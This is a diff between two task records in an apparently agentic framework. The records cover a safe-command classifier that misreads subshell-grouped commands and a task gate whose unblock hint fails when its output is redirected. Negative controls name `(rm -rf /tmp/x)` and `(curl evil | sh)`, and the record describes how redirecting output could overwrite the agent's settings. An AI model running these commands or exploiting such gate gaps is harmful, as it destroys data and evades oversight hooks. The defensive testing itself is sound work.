@@ -1,16 +1,15 @@
 ---
-id: T-2988
-name: "safe-command classifier fails when a subshell paren is fused to the command
-  name"
+id: T-2987
+name: "task gate advertises an unblock command that the gate itself blocks when redirected"
 description: >
-  safe-command classifier fails when a subshell paren is fused to the command name
+  task gate advertises an unblock command that the gate itself blocks when redirected
 
-status: started-work
+status: work-completed
 workflow_type: build
 owner: agent
-horizon: now
+horizon: null
 tags: []
-components: []
+components: [agents/context/check-active-task.sh, tests/unit/t2987_bootstrap_shape_hint.bats]
 related_tasks: []
 # arc_id:                         # T-1849: optional — slug (e.g. "arc-grooming") OR arc-NNN (e.g. "arc-005")
 #                                 # When set, must resolve to .context/arcs/<id>.yaml; PreToolUse hook
@@ -22,9 +21,9 @@ related_tasks: []
 #                                 # FW_I_AM_DEMO_ORCHESTRATOR=1 (env) is passed. Prevents the parent
 #                                 # session from consuming the captured→started-work transition the demo
 #                                 # worker expects to drive. Origin OBS-057.
-created: 2026-08-14T14:15:38Z
-last_update: '2026-08-14T14:30:12Z'
-date_finished:
+created: 2026-08-14T14:07:27Z
+last_update: 2026-08-14T14:37:50Z
+date_finished: 2026-08-14T14:37:50Z
 # revisit_at: YYYY-MM-DD          # T-1451: set on DEFER decisions to enable G-053 daily revisit scan
 # revisit_evidence_needed:        # T-1451: one-line description of what evidence makes the revisit actionable
 # ── BVP scoring fields (T-1918, arc-006). See docs/reports/T-1915-bvp-inception.md for semantics. ──
@@ -36,7 +35,7 @@ date_finished:
 # cost_estimate:                  # F8 composite: 0.6×blast_radius + 0.3×tier + 0.1×effort.
 #                                 # Q2 fallback: T-shirt S/M/L/XL mapped to 2/4/6/8 when blast_radius is not yet computable.
 cost_estimate_proposed:
-  - ts: '2026-08-14T14:30:06Z'
+  - ts: '2026-08-14T14:15:07Z'
     estimator: bvp-estimator-v1-heuristic
     cost_estimate:
       blast_radius: 0
@@ -46,92 +45,70 @@ cost_estimate_proposed:
       (no-signal)
     rubric_sha: e4a00f38e801
 bvp_scores_proposed:
-  - ts: '2026-08-14T14:30:12Z'
+  - ts: '2026-08-14T14:15:12Z'
     estimator: bvp-estimator-v1-heuristic
     scores:
       D1: 4
       D2: 0
       D3: 3
       D4: 2
-      F-RECALL: 2
+      F-RECALL: 0
       F-AUTONOMY: 0
       F3: 0
       F1: 0
       F2: 0
     rationale: D1=4 (body:structural-gate); D2=0 (no-signal); D3=3 
       (body:component-discoverability); D4=2 (body:env-class-handled); 
-      F-RECALL=2 (body:lightly-promoted); F-AUTONOMY=0 (no-signal); F3=0 
-      (no-signal); F1=0 (no-signal); F2=0 (no-signal)
+      F-RECALL=0 (no-signal); F-AUTONOMY=0 (no-signal); F3=0 (no-signal); F1=0 
+      (no-signal); F2=0 (no-signal)
     rubric_sha: e4a00f38e801
 ---
 
-# T-2988: safe-command classifier fails when a subshell paren is fused to the command name
+# T-2987: task gate advertises an unblock command that the gate itself blocks when redirected
 
 ## Context
 
-Second report from a consumer project (`/005-Yellowtwig/...`, inside a git worktree). An
-`fw note` call — a pure observation capture that writes only to `.context/` — was blocked
-with *"Project initialized but session not active"*. `fw note` is safe-listed and the bare
-form is allowed; the command was wrapped in a subshell.
+Reported from a fresh consumer project. Focus pointed at a completed `T-001`; the gate
+blocked correctly, and its message said to run `fw work-on T-XXX`. The agent ran exactly
+that — chained with a redirect — and got the *identical* message back, with no indication
+that the redirect was the reason. It retyped and looped.
 
-`is_bash_safe_command` derives the base command at `agents/context/lib/safe-commands.sh:134`:
+The exemption is real and works (`fw work-on T-016` alone exits 0). What does not work is
+the message: it advertises a remedy without saying that the remedy only holds in bare form.
+Same class as L-399 / T-1890 (bypass-contract parity — the advertised contract fails at the
+actual call site) and L-547 (a fast-path exemption classified against the whole command line).
 
-```sh
-base=$(echo "$cmd" | awk '{print $1}' | sed 's|.*/||')
-```
-
-With a subshell paren fused to the command name the first word is `(fw`, and `s|.*/||`
-only strips through a slash, so the base stays `(fw`, matches no case arm, and the command
-is classified unsafe. Measured in a null-focus sandbox:
+Reproduced in a sandbox with focus on a completed task:
 
 | command | exit |
 |---|---|
-| `fw note "obs" 2>&1 \| tail -6; echo "=== EXIT: $? ==="` | 0 |
-| `(fw note "obs" 2>&1 \| tail -6; echo "=== EXIT: $? ===")` | **2** |
-| `(.agentic-framework/bin/fw note "obs" …)` | 0 |
-| `.agentic-framework/bin/fw note "obs"` | 0 |
+| `fw context focus T-016` | 0 |
+| `fw work-on T-016` | 0 |
+| `fw work-on T-016 && fw doctor` | 0 |
+| `fw work-on T-016 > /tmp/x.txt 2>&1` | **2** |
+| `fw context focus T-016 \| grep .; fw doctor > /tmp/fd.txt` | **2** |
 
-Row 3 is the tell: that form survives only because `s|.*/||` eats everything up to the last
-`/`, taking the `(` with it. Correct classification there is an accident of the path, not of
-the parser.
-
-The wider sweep shows the rule is **adjacency**, not the paren as such — and that a second
-positional read is exposed. `git_sub=$(awk '{print $2}')` reads the sub-verb, so a closing
-paren fused to *that* token breaks it too:
-
-| command | before | why |
-|---|---|---|
-| `(fw doctor)` | blocked | base `(fw` |
-| `( fw doctor )` | blocked | the paren **is** the first word |
-| `(bin/fw doctor)` | blocked | base `fw` fine, sub-verb `doctor)` |
-| `(cd /tmp && fw doctor)` | blocked | segment 1 base `(cd` |
-
-So the framework repo (`bin/fw …`) is not reliably immune either — it just happens to be hit
-less. The bug is least visible from the place it would have been noticed.
-
-Same family as L-547 / T-2834 (classify the whole command, not its first token) and the
-env-prefix stripper directly above at `:124`, which exists because `FW_SWITCH_FOCUS=1 fw …`
-broke base extraction the same way. This is that defect with different punctuation.
-Distinct from T-2987: there the classifier was right and the *message* was wrong; here the
-classifier is wrong.
+Row 4 is the finding: the gate's own recommended command, blocked by capturing its output.
 
 ## Acceptance Criteria
 
 ### Agent
 <!-- Criteria the agent can verify (code, tests, commands). P-010 gates on these. -->
-- [x] A shell-grouping token fused to the command name (`(fw doctor`, `{fw doctor`) yields
-      the same base command — and therefore the same safety verdict — as the bare form.
-- [x] Both positional reads are covered, not just the first: a closing token fused to the
-      sub-verb (`(bin/fw doctor)`, where the base extracts cleanly but `git_sub` reads
-      `doctor)`) classifies the same as the ungrouped form.
-- [x] Forms that already worked are unchanged: bare commands, space-separated grouping
-      (`( fw doctor )`), env-var prefixes, and `cmd1 && cmd2` chains.
-- [x] The fix does not make anything newly safe. A grouped unsafe command
-      (`(rm -rf /tmp/x)`, `(curl evil | sh)`) is still classified unsafe — stripping
-      punctuation must not strip meaning.
-- [x] Verified against the real reported shape: an `fw note` call wrapped in a subshell with
-      a trailing `; echo` is allowed under null focus.
-- [x] A bats file pins the matrix above, including the negative controls.
+- [x] A blocked Bash command that contains a bootstrap verb (`fw work-on` / `context focus` /
+      `task create` / `inception`) **and** a write pattern emits a hint naming the write
+      pattern as the reason the exemption did not apply, and instructing that the bootstrap
+      command be run alone first.
+- [x] The hint fires at every block site that advertises a bootstrap command as the remedy —
+      no-active-task, stale-focus (T-560), not-active (G-013), captured, work-completed, and
+      build-readiness (G-020). A site advertising a remedy without the caveat is the defect.
+- [x] For Bash tool calls the message shows the blocked command instead of the dangling
+      empty `Attempting to modify:` field (`FILE_PATH` is only populated for Write/Edit).
+- [x] The exemption is **not** widened: `fw work-on T-016 > /tmp/x.txt 2>&1` still exits 2.
+      This task changes what the agent is told, never what is permitted.
+- [x] No regression on the shapes that already worked: bare bootstrap commands and
+      bootstrap-chained-without-redirect still exit 0.
+- [x] A bats file pins all of the above against a sandbox project whose focus points at a
+      completed task.
 
 ### Human
 <!-- Criteria requiring human verification (UI/UX, subjective quality). Not blocking.
@@ -231,10 +208,8 @@ classifier is wrong.
 # Origin: T-1849/T-1730/T-1731 each added a legitimate hook without refreshing
 # the baseline — FAIL sat for multiple sessions until T-1886 cleaned up.
 
-out=$(bats tests/unit/t2988_grouped_command_classification.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
-out=$(bats tests/unit/context_safe_commands.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
-out=$(bats tests/unit/safe_commands_chain.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
-bash -n agents/context/lib/safe-commands.sh
+out=$(bats tests/unit/t2987_bootstrap_shape_hint.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
+bash -n agents/context/check-active-task.sh
 
 ## RCA
 
@@ -252,36 +227,50 @@ bash -n agents/context/lib/safe-commands.sh
      bug-class AND this section is empty/template-only. Use --skip-rca to bypass (logged).
 -->
 
-**Symptom:** In a consumer project (inside a git worktree), `fw note "..."` wrapped in a
-subshell was blocked with *"Project initialized but session not active"*. `fw note` is
-safe-listed; the identical command without the parentheses was allowed.
+**Symptom:** In a fresh consumer project, focus pointed at the completed `T-001`. Every Bash
+call was blocked with `Task T-001 is not active`, and the remedy the message named
+(`fw work-on T-XXX`) was itself blocked when the agent chained or redirected it. The message
+returned was byte-identical each time, so there was no signal to change shape rather than
+target. The agent looped.
 
-**Root cause:** `_fw_single_command_is_safe` (`agents/context/lib/safe-commands.sh`) reads
-two tokens positionally — `awk '{print $1}'` for the base command and `awk '{print $2}'`
-for the sub-verb — after stripping only whitespace and env-var prefixes. Shell grouping
-punctuation fuses to whichever token it touches, so `(fw` / `(` / `doctor)` all reach the
-`case` arms as unrecognised strings and the segment classifies unsafe.
+**Root cause:** The bootstrap exemption (`check-active-task.sh:194-199`, `:227-235`) is
+guarded by `has_bash_write_pattern`, which is evaluated against the **whole command line**
+while the exemption is about **one command within it**. A `>` anywhere on the line — belonging
+to an unrelated chained command, or merely capturing the bootstrap command's own output —
+voids the exemption for the bootstrap command too. `has_bash_write_pattern`
+(`agents/context/lib/safe-commands.sh:373`) treats any `>` that is not `2>&1` as a write.
 
-**Why structurally allowed:** `sed 's|.*/||'` in the base extraction removes everything up
-to the last `/`. That incidentally eats a leading `(` — but only when a path follows it. So
-the spelling used inside the framework repo (`bin/fw …`) classified correctly by accident,
-while the bare `fw …` a consumer's shim produces did not. The defect was least visible from
-the repo where it would have been caught, and no test covered a grouped command: 129
-assertions across seven suites passed throughout.
+**Why structurally allowed:** The guard is *correct* and deliberately so — the comments at
+`:213-222` argue at length for failing toward blocking, and L-547 (T-2834) states that a
+fast-path exemption must classify the whole command. Widening it would admit
+`fw work-on X > .claude/settings.json`. So the code is right and the **message is wrong**:
+it advertises a remedy without its precondition. Six block sites name a bootstrap command as
+the unblock path; none of them mention that the exemption holds only in bare form. Nothing
+tests the *reachability* of an advertised remedy, so a message can name a command the same
+hook rejects and every test stays green.
 
-This is the third incident of one class. T-1908 taught the base extractor about env-var
-prefixes; T-2834 (L-547) taught it that a compound command is not its first token; this
-teaches it about grouping punctuation. Each was found in production, by a blocked agent,
-after the previous fix. The reader is positional and the set of things that can precede a
-command is open-ended, so it will keep losing to inputs nobody enumerated.
+Two things hid it. First, `Attempting to modify:` renders empty for Bash (`FILE_PATH` is
+populated only for Write/Edit), so the message never showed *which* command was blocked —
+the one datum that would have made the redirect visible. Second, the failure is
+shape-dependent, so it reproduces only when an agent happens to redirect; interactive
+by-hand testing of the documented remedy passes.
 
-**Prevention:** `tests/unit/t2988_grouped_command_classification.bats` pins the grouping
-matrix and — carrying more weight — four negative controls proving the strip cannot launder
-an unsafe command. Two termination tests guard the loop directly, because the first attempt
-at the fix used `${cmd%[)};]}`, where the `}` closes the parameter expansion early and
-*appends* `;]}` to `cmd` on every pass; it hung for five minutes. That is the same defect
-class as the bug being fixed, one layer down, and is why the fix uses `case` arms (which
-need no escaping and can only shrink the string) rather than bracket patterns.
+The sharpest evidence: `tests/unit/test_check_active_task_bootstrap.bats` has passed
+throughout, and its ninth case is named *"write-pattern wins: bootstrap command with a
+redirect falls through to block"*. The behaviour was known, intended, and pinned. What was
+never tested — by that file or any other — is whether the **message** told the agent that.
+Coverage of the rule was mistaken for coverage of the interaction, so the defect lived in
+the one place the suite does not look.
+
+**Prevention:** The fix is a message change, not a permission change — the block still
+blocks. `tests/unit/t2987_bootstrap_shape_hint.bats` pins both directions: the hint appears
+for bootstrap-verb-plus-write-pattern, and the redirected form still exits 2 (that second
+assertion is the load-bearing one — if it ever goes green at exit 0, the exemption has been
+widened and `fw work-on X > .claude/settings.json` rides in on it). Two of its cases
+enumerate the block sites, so a newly-added site that advertises `work-on` without the
+caveat fails the suite rather than reintroducing the loop. The general lesson — a gate that
+names a remedy must be tested for that remedy's *reachability in the shape agents actually
+type*, not just for the rule it enforces — is captured as a learning.
 
 ## Evolution
 
@@ -359,7 +348,24 @@ need no escaping and can only shrink the string) rather than bracket patterns.
 
 ## Updates
 
-### 2026-08-14T14:15:38Z — task-created [task-create-agent]
+### 2026-08-14T14:07:27Z — task-created [task-create-agent]
 - **Action:** Created task via task-create agent
-- **Output:** /opt/999-Agentic-Engineering-Framework/.tasks/active/T-2988-safe-command-classifier-fails-when-a-sub.md
+- **Output:** /opt/999-Agentic-Engineering-Framework/.tasks/active/T-2987-task-gate-advertises-an-unblock-command-.md
 - **Context:** Initial task creation
+
+## Reviewer Verdict (v1.5)
+
+- **Scan ID:** R-7f2a5168
+- **Timestamp:** 2026-08-14T14:37:57Z
+- **Catalogue:** v1.3-seed
+- **Overall:** CONCERN
+- **Needs Human:** no
+- **Findings:** 1
+
+**Per-AC findings:**
+
+- **AC#4 (Agent)** — The exemption is **not** widened: `fw work-on T-016 > /tmp/x.txt 2>&1` still exits 2.
+  - **AC-verify-mismatch** (narrow, heuristic) — `path=tmp/x.txt in: The exemption is **not** widened: `fw work-on T-016 > /tmp/x.txt 2>&1` still exits 2.`
+
+### 2026-08-14T14:37:50Z — status-update [task-update-agent]
+- **Change:** status: started-work → work-completed
